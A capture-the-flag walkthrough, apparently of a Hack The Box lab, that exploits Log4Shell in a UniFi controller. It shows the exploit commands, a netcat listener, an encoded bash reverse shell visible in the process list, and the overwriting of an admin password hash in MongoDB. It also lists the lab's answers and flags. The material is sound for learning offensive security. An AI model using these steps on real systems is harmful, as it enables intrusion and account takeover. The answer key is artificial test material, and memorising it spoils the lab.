First scan the target using nmap:
`sudo nmap -sC -sS 10.129.229.171 -oA unified`

```txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 03:06 EDT
Nmap scan report for 10.129.229.171
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.229.171:8443/manage
8443/tcp open  https-alt
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24

Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
```

From nmap result, we get the following answers:
1 Ans: 22,6789,8080,8443
2 Ans: UniFi Network

As we did not get any version of the software running on port 8443 from nmap, let's try to visit the URL to check if we can find anything.

We visited http://10.129.117.238:8443/ and got the following error:
```txt
Bad Request
This combination of host and port requires TLS.
```

After googling the issue, we found out that we need to use `https` to visit our site. After trying to visit https://10.129.117.238:8443/ we found the following page:

![[Pasted image 20220715181140.png]]
We can see the version here.

3 Ans: 6.4.54

After googling the CVE for unifi with this version, we found out the CVE no.

4 Ans: CVE-2021-44228

We can also google the answers for question 5, 6 and 7

5 Ans: ldap
6 Ans: tcpdump
7 Ans: 389

Now to see all the process running on the server, we need to set a reverse-tcp shell into that server. As we know the server is vulnerable for CVE-2021-44228, let's try to exploit it by following the guideline mentioned here: https://github.com/puzzlepeaches/Log4jUnifi

Commands:
`sudo nc -lnvp 4445`
`python3 exploit.py -u https://10.129.117.238:8443 -i 10.10.15.15 -p 4445`

After successul reverse-tcp connection, let's try to find the user flag by using the following commands:
`cd /`
`find . -type f -name user.txt 2>/dev/null`

We found the flag in ./home/michael/user.txt fiel. lets cat and get the flag:
`cat ./home/michael/user.txt`

Ans 13: 6ced1a6a89e666c0620cdb10262ba127

lets find all the processes running by running the following command:
`ps aux`
```txt
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
unifi          1  0.0  0.0   1080     4 ?        Ss   12:56   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi
unifi          7  0.0  0.1  18512  3072 ?        S    12:56   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi
unifi         17  1.2 26.2 3671536 533392 ?      Sl   12:56   0:54 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start
unifi         67  0.4  4.1 1100676 84768 ?       Sl   12:57   0:19 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       1821  0.0  0.1  18380  2944 ?        S    13:59   0:00 bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
unifi       1825  0.0  0.1  18512  3308 ?        S    13:59   0:00 bash -i
unifi       1828  0.0  0.1  18380  3124 ?        S    13:59   0:00 bash
unifi       1930  0.0  0.1  18512  3476 ?        S    14:02   0:00 bash -i
unifi       2085  0.0  0.1  34408  2748 ?        R    14:07   0:00 ps aux
```

As we can see, mongo db service is running on port 27117
Ans 8: 27117

To make the shell more interactive, we used the following command:
`export TERM=xterm`

As we know the mongo server is running locally (as we saw nmap did not find 27117 port open), we tried to connect to the db locally as we have the local shell. Command:
`mongo --port 27117`

After successfully connecting, we can now list all the databases by using the following command:
`show dbs`

For to enermurate all the users, we need to use `db.admin.find()` command (found in google).
Ans 9: db.admin.find()

For to update the user, we need to use `db.admin.update()` command (found in google).
Ans 10: db.admin.update()

Now as we cannot crack the hash if the admin, let's try to update the DB with our own password. Guidelines can be found here:
https://stackoverflow.com/questions/67310229/unifi-contoller-password-reset

`mkpasswd --method=sha-512 --salt=9Ter1EZ9$lSt6 admin`
`$6$9Ter1EZ9$ahgHttZMiCttwnsGD4xRCGzC/CHUlveQZmnKUfumqCU8BTro8hcT/jOZq0EwKNKoNCgh5wvu3ZBlwWqxFg1uA1`

`db.admin.update({ "_id" : ObjectId("61ce278f46e0fb0012d47ee4")},{$set: {"x_shadow" : "$6$9Ter1EZ9$ahgHttZMiCttwnsGD4xRCGzC/CHUlveQZmnKUfumqCU8BTro8hcT/jOZq0EwKNKoNCgh5wvu3ZBlwWqxFg1uA1"}})`

As we've updated the password, let's try to login from the web and go through the pages to find anything interesting.

After going through the pages for a while, we found the SSH login username and password:
![[Pasted image 20220715213510.png]]

Ans 12: NotACrackablePassword4U2022

Now just log in via ssh as root and grab the flag:
ssh root@10.129.117.238
cat root.txt

Ans 14: e50bc93c75b634e4b272d2f771c33681